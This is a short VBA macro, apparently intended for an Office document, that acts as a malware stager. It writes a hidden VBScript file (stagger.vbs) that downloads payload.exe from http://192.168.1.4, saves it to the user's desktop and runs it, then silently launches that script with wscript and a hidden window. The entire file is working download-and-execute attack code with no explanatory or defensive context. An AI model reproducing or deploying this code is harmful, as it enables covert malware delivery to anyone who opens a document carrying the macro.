Sub WritePayloadFile()
    Dim PayloadFile As Integer
    Dim FilePath As String
    Dim Command As String
    
    ' Define file path
    FilePath = "C:\Users\510\Desktop\stagger.vbs"
    
    ' Get next available file number
    PayloadFile = FreeFile
    
    ' Open file for output
    Open FilePath For Output As PayloadFile
    
    ' Write to file
    Print #PayloadFile, "Sub HTTPDownload(MyURL, FilePath)"
    Print #PayloadFile, "    Dim objFSO, objFile, objHTTP, WSShell, i"
    Print #PayloadFile, "    Set objFSO = CreateObject(""Scripting.FileSystemObject"")"
    Print #PayloadFile, "    Set objFile = objFSO.OpenTextFile(FilePath, 2, True)"
    Print #PayloadFile, "    Set objHTTP = CreateObject(""WinHTTP.WinHTTPRequest.5.1"")"
    Print #PayloadFile, "    Set WSShell = CreateObject(""Wscript.Shell"")"
    Print #PayloadFile, "    objHTTP.Open ""GET"", MyURL, False"
    Print #PayloadFile, "    objHTTP.Send"
    Print #PayloadFile, "    For i=1 To LenB(objHTTP.ResponseBody)"
    Print #PayloadFile, "        objFile.Write(Chr(AscB(MidB(objHTTP.ResponseBody, i, 1))))"
    Print #PayloadFile, "    Next"
    Print #PayloadFile, "    objFile.Close"
    Print #PayloadFile, "    WSShell.Run FilePath"
    Print #PayloadFile, "End Sub"
    Print #PayloadFile, "HTTPDownload ""http://192.168.1.4/payload.exe"", ""C:\Users\510\Desktop\payload.exe"""
    
    ' Close the file
    Close PayloadFile
    
    Command = "wscript /b """ & FilePath & """"
    Shell Command, vbHide
End Sub
